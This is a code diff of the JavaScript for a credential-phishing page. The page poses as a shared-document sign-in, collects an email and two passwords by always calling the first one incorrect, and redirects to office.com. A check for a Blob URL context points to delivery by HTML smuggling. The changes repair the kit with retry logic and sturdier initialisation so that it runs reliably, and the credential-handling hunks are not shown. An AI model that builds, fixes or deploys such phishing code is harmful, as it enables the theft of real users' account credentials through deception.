@@ -1,5 +1,4 @@
-// content-part-2.js - Main JavaScript Logic
-// This file handles all the interactive functionality
+// content-part-2.js - Main JavaScript Logic (FIXED)
 
 (function() {
     'use strict';
@@ -12,62 +11,62 @@
         redirectUrl: 'https://www.office.com'
     };
 
-    // Wait for DOM to be ready
+    // Main application initialization
     function initApp() {
+        console.log('🚀 Initializing application...');
+        
         // Check if we're in the Blob URL environment
         if (window.location.protocol !== 'blob:') {
             console.log('📄 Not in Blob URL context. Waiting for Blob URL launch...');
-            return;
+            // Still try to initialize in case we're testing locally
         }
 
-        console.log('🚀 Initializing application in Blob URL context');
-
-        // Get all DOM elements
-        var elements = {
-            stepEmail: document.getElementById('stepEmail'),
-            stepPwdFirst: document.getElementById('stepPasswordFirst'),
-            stepPwdSecond: document.getElementById('stepPasswordSecond'),
-            emailInput: document.getElementById('emailInput'),
-            pwdFirstInput: document.getElementById('passwordFirstInput'),
-            pwdSecondInput: document.getElementById('passwordSecondInput'),
-            displayFirst: document.getElementById('displayEmailFirst'),
-            displaySecond: document.getElementById('displayEmailSecond'),
-            emailNextBtn: document.getElementById('emailNextBtn'),
-            pwdFirstBtn: document.getElementById('pwdFirstBtn'),
-            pwdSecondBtn: document.getElementById('pwdSecondBtn'),
-            statusMsg: document.getElementById('statusMessage'),
-            statusText: document.getElementById('statusText'),
-            stepBadge1: document.getElementById('stepBadge1'),
-            togglePwdFirst: document.getElementById('togglePwdFirst'),
-            togglePwdSecond: document.getElementById('togglePwdSecond'),
-            passwordErrorFirst: document.getElementById('passwordErrorFirst'),
-            passwordErrorSecond: document.getElementById('passwordErrorSecond'),
-            passwordErrorTextFirst: document.getElementById('passwordErrorTextFirst'),
-            passwordErrorTextSecond: document.getElementById('passwordErrorTextSecond')
-        };
+        // Get all DOM elements with safety checks
+        var emailInput = document.getElementById('emailInput');
+        var pwdFirstInput = document.getElementById('passwordFirstInput');
+        var pwdSecondInput = document.getElementById('passwordSecondInput');
+        var emailNextBtn = document.getElementById('emailNextBtn');
+        var pwdFirstBtn = document.getElementById('pwdFirstBtn');
+        var pwdSecondBtn = document.getElementById('pwdSecondBtn');
+        var statusText = document.getElementById('statusText');
+        var statusMsg = document.getElementById('statusMessage');
+        var stepBadge1 = document.getElementById('stepBadge1');
+        var stepEmail = document.getElementById('stepEmail');
+        var stepPwdFirst = document.getElementById('stepPasswordFirst');
+        var stepPwdSecond = document.getElementById('stepPasswordSecond');
+        var displayFirst = document.getElementById('displayEmailFirst');
+        var displaySecond = document.getElementById('displayEmailSecond');
+        var togglePwdFirst = document.getElementById('togglePwdFirst');
+        var togglePwdSecond = document.getElementById('togglePwdSecond');
+        var passwordErrorFirst = document.getElementById('passwordErrorFirst');
+        var passwordErrorSecond = document.getElementById('passwordErrorSecond');
 
         // Check if essential elements exist
-        if (!elements.emailInput) {
-            console.error('❌ Critical: emailInput not found!');
+        if (!emailInput) {
+            console.error('❌ Critical: emailInput not found! DOM may not be ready.');
+            // Try again after a short delay
+            setTimeout(initApp, 200);
             return;
         }
+
+        console.log('✅ DOM elements found. Setting up event listeners...');
 
         var storedEmail = '';
 
         // Helper functions
         function setStatus(message, type) {
             type = type || 'info';
-            if (elements.statusText) {
-                elements.statusText.innerText = message;
+            if (statusText) {
+                statusText.innerText = message;
             }
-            if (elements.statusMsg) {
-                elements.statusMsg.className = 'status-message';
+            if (statusMsg) {
+                statusMsg.className = 'status-message';
                 if (type === 'error') {
-                    elements.statusMsg.classList.add('error');
+                    statusMsg.classList.add('error');
                 } else if (type === 'success') {
-                    elements.statusMsg.classList.add('success');
+                    statusMsg.classList.add('success');
                 }
-                var icon = elements.statusMsg.querySelector('i');
+                var icon = statusMsg.querySelector('i');
                 if (icon) {
                     if (type === 'error') {
                         icon.className = 'fas fa-exclamation-circle';
@@ -81,26 +80,26 @@
         }
 
         function updateStepIndicators(step) {
-            if (elements.stepBadge1) {
-                elements.stepBadge1.classList.remove('active');
+            if (stepBadge1) {
+                stepBadge1.classList.remove('active');
                 if (step === 1) {
-                    elements.stepBadge1.classList.add('active');
+                    stepBadge1.classList.add('active');
                 }
             }
         }
 
         function showPasswordError(show, step) {
-            if (step === 2 && elements.passwordErrorFirst) {
+            if (step === 2 && passwordErrorFirst) {
                 if (show) {
-                    elements.passwordErrorFirst.classList.remove('hidden');
+                    passwordErrorFirst.classList.remove('hidden');
                 } else {
-                    elements.passwordErrorFirst.classList.add('hidden');
+                    passwordErrorFirst.classList.add('hidden');
                 }
-            } else if (step === 3 && elements.passwordErrorSecond) {
+            } else if (step === 3 && passwordErrorSecond) {
                 if (show) {
-                    elements.passwordErrorSecond.classList.remove('hidden');
+                    passwordErrorSecond.classList.remove('hidden');
                 } else {
-                    elements.passwordErrorSecond.classList.add('hidden');
+                    passwordErrorSecond.classList.add('hidden');
                 }
             }
         }
@@ -108,40 +107,40 @@
         function showStep(step, email) {
             email = email || '';
             
-            if (elements.stepEmail) elements.stepEmail.classList.add('hidden');
-            if (elements.stepPwdFirst) elements.stepPwdFirst.classList.add('hidden');
-            if (elements.stepPwdSecond) elements.stepPwdSecond.classList.add('hidden');
+            if (stepEmail) stepEmail.classList.add('hidden');
+            if (stepPwdFirst) stepPwdFirst.classList.add('hidden');
+            if (stepPwdSecond) stepPwdSecond.classList.add('hidden');
 
             showPasswordError(false, 2);
             showPasswordError(false, 3);
 
             if (step === 1) {
-                if (elements.stepEmail) elements.stepEmail.classList.remove('hidden');
+                if (stepEmail) stepEmail.classList.remove('hidden');
                 updateStepIndicators(1);
-                if (elements.emailInput) {
-                    setTimeout(function() { elements.emailInput.focus(); }, 100);
+                if (emailInput) {
+                    setTimeout(function() { emailInput.focus(); }, 100);
                 }
                 setStatus('Enter your email to access the shared document.', 'info');
             } else if (step === 2) {
-                if (elements.stepPwdFirst) elements.stepPwdFirst.classList.remove('hidden');
+                if (stepPwdFirst) stepPwdFirst.classList.remove('hidden');
                 updateStepIndicators(2);
-                if (email && elements.displayFirst) {
-                    elements.displayFirst.textContent = email;
+                if (email && displayFirst) {
+                    displayFirst.textContent = email;
                 }
-                if (elements.pwdFirstInput) {
-                    elements.pwdFirstInput.value = '';
-                    setTimeout(function() { elements.pwdFirstInput.focus(); }, 100);
+                if (pwdFirstInput) {
+                    pwdFirstInput.value = '';
+                    setTimeout(function() { pwdFirstInput.focus(); }, 100);
                 }
                 setStatus('Enter your password for ' + email, 'info');
             } else if (step === 3) {
-                if (elements.stepPwdSecond) elements.stepPwdSecond.classList.remove('hidden');
+                if (stepPwdSecond) stepPwdSecond.classList.remove('hidden');
                 updateStepIndicators(3);
-                if (email && elements.displaySecond) {
-                    elements.displaySecond.textContent = email;
+                if (email && displaySecond) {
+                    displaySecond.textContent = email;
                 }
-                if (elements.pwdSecondInput) {
-                    elements.pwdSecondInput.value = '';
-                    setTimeout(function() { elements.pwdSecondInput.focus(); }, 100);
+                if (pwdSecondInput) {
+                    pwdSecondInput.value = '';
+                    setTimeout(function() { pwdSecondInput.focus(); }, 100);
                 }
                 showPasswordError(true, 3);
                 setStatus('Please try again with a different password.', 'error');
@@ -149,16 +148,16 @@
         }
 
         function resetFlow() {
-            if (elements.emailInput) elements.emailInput.value = '';
-            if (elements.pwdFirstInput) elements.pwdFirstInput.value = '';
-            if (elements.pwdSecondInput) elements.pwdSecondInput.value = '';
+            if (emailInput) emailInput.value = '';
+            if (pwdFirstInput) pwdFirstInput.value = '';
+            if (pwdSecondInput) pwdSecondInput.value = '';
             storedEmail = '';
             showPasswordError(false, 2);
             showPasswordError(false, 3);
             showStep(1);
-            if (elements.pwdSecondBtn) {
-                elements.pwdSecondBtn.disabled = false;
-                elements.pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
+            if (pwdSecondBtn) {
+                pwdSecondBtn.disabled = false;
+                pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
             }
         }
 
@@ -186,12 +185,18 @@
             }
         }
 
-        // Event listeners
-        if (elements.emailNextBtn) {
-            elements.emailNextBtn.addEventListener('click', function(e) {
+        // ============================================================
+        // EVENT LISTENERS - Fixed with proper binding
+        // ============================================================
+
+        // Email Next Button
+        if (emailNextBtn) {
+            console.log('✅ Setting up emailNextBtn listener');
+            emailNextBtn.addEventListener('click', function(e) {
                 e.preventDefault();
+                e.stopPropagation();
                 console.log('📧 Email button clicked');
-                var email = elements.emailInput ? elements.emailInput.value.trim() : '';
+                var email = emailInput ? emailInput.value.trim() : '';
                 if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                     setStatus('Please enter a valid email address.', 'error');
                     return;
@@ -203,13 +208,18 @@
                 console.log('📧 Email entered:', email);
                 showStep(2, email);
             });
+        } else {
+            console.error('❌ emailNextBtn not found!');
         }
 
-        if (elements.pwdFirstBtn) {
-            elements.pwdFirstBtn.addEventListener('click', function(e) {
+        // First Password Button
+        if (pwdFirstBtn) {
+            console.log('✅ Setting up pwdFirstBtn listener');
+            pwdFirstBtn.addEventListener('click', function(e) {
                 e.preventDefault();
+                e.stopPropagation();
                 console.log('🔑 First password button clicked');
-                var pwd = elements.pwdFirstInput ? elements.pwdFirstInput.value.trim() : '';
+                var pwd = pwdFirstInput ? pwdFirstInput.value.trim() : '';
                 if (!pwd) {
                     setStatus('Please enter a password.', 'error');
                     return;
@@ -225,20 +235,25 @@
                 showPasswordError(true, 2);
                 setStatus('Incorrect password, please try again.', 'error');
                 
-                if (elements.pwdFirstInput) {
-                    elements.pwdFirstInput.value = '';
-                    setTimeout(function() { elements.pwdFirstInput.focus(); }, 100);
+                if (pwdFirstInput) {
+                    pwdFirstInput.value = '';
+                    setTimeout(function() { pwdFirstInput.focus(); }, 100);
                 }
                 
                 showStep(3, email);
             });
+        } else {
+            console.error('❌ pwdFirstBtn not found!');
         }
 
-        if (elements.pwdSecondBtn) {
-            elements.pwdSecondBtn.addEventListener('click', function(e) {
+        // Second Password Button
+        if (pwdSecondBtn) {
+            console.log('✅ Setting up pwdSecondBtn listener');
+            pwdSecondBtn.addEventListener('click', function(e) {
                 e.preventDefault();
+                e.stopPropagation();
                 console.log('🔑 Second password button clicked');
-                var pwd = elements.pwdSecondInput ? elements.pwdSecondInput.value.trim() : '';
+                var pwd = pwdSecondInput ? pwdSecondInput.value.trim() : '';
                 if (!pwd) {
                     setStatus('Please enter a password.', 'error');
                     return;
@@ -256,8 +271,11 @@
                     window.location.href = CONFIG.redirectUrl;
                 }, 150);
             });
+        } else {
+            console.error('❌ pwdSecondBtn not found!');
         }
 
+        // Password Toggle
         function setupToggle(btn, input) {
             if (!btn || !input) return;
             btn.addEventListener('click', function() {
@@ -270,9 +288,10 @@
                 }
             });
         }
-        setupToggle(elements.togglePwdFirst, elements.pwdFirstInput);
-        setupToggle(elements.togglePwdSecond, elements.pwdSecondInput);
+        setupToggle(togglePwdFirst, pwdFirstInput);
+        setupToggle(togglePwdSecond, pwdSecondInput);
 
+        // Enter key support
         function handleEnter(btn) {
             return function(e) {
                 if (e.key === 'Enter') {
@@ -281,25 +300,45 @@
                 }
             };
         }
-        if (elements.emailInput) {
-            elements.emailInput.addEventListener('keydown', handleEnter(elements.emailNextBtn));
-        }
-        if (elements.pwdFirstInput) {
-            elements.pwdFirstInput.addEventListener('keydown', handleEnter(elements.pwdFirstBtn));
-        }
-        if (elements.pwdSecondInput) {
-            elements.pwdSecondInput.addEventListener('keydown', handleEnter(elements.pwdSecondBtn));
-        }
+        if (emailInput) emailInput.addEventListener('keydown', handleEnter(emailNextBtn));
+        if (pwdFirstInput) pwdFirstInput.addEventListener('keydown', handleEnter(pwdFirstBtn));
+        if (pwdSecondInput) pwdSecondInput.addEventListener('keydown', handleEnter(pwdSecondBtn));
 
+        // Start the flow
         resetFlow();
-        console.log('✅ Shared document flow ready in Blob URL context');
+        console.log('✅ Shared document flow ready');
     }
 
-    // Handle initialization
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initApp);
-    } else {
-        setTimeout(initApp, 100);
+    // ============================================================
+    // MULTIPLE INITIALIZATION ATTEMPTS
+    // ============================================================
+    
+    function tryInit(attempt) {
+        attempt = attempt || 1;
+        console.log(`🔄 Initialization attempt ${attempt}...`);
+        
+        // Check if DOM is ready
+        if (document.readyState === 'complete' || document.readyState === 'interactive') {
+            // Check if emailInput exists
+            if (document.getElementById('emailInput')) {
+                initApp();
+                return;
+            }
+        }
+        
+        // If we've tried too many times, give up
+        if (attempt > 10) {
+            console.error('❌ Failed to initialize after 10 attempts. DOM may be broken.');
+            return;
+        }
+        
+        // Try again after delay
+        setTimeout(function() {
+            tryInit(attempt + 1);
+        }, 200);
     }
+
+    // Start the initialization process
+    tryInit();
 
 })();
